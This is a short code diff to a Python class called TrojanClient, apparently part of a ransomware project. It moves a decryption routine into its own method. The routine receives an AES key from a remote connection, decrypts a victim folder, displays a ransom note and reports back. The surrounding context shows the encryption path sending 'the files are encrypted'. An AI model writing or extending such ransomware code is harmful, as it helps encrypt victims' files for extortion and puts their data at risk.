@@ -155,10 +155,7 @@ class TrojanClient:
         aes_key = protocol.receive(self.connection)
 
         #decrepption
-        FileEncryptor.decrypt_folder(self.folder, aes_key)
-        del aes_key
-        RansomNote.display_decryption_note()
-        protocol.send(self.connection, "the files are decrypted")
+
         
         sys.exit()
         
@@ -167,6 +164,12 @@ class TrojanClient:
         del aes_key
         RansomNote.display_encryption_note()
         protocol.send(self.connection, "the files are encrypted")
+    
+    def decryption(self, aes_key):
+        FileEncryptor.decrypt_folder(self.folder, aes_key)
+        del aes_key
+        RansomNote.display_decryption_note()
+        protocol.send(self.connection, "the files are decrypted")
 
 
 
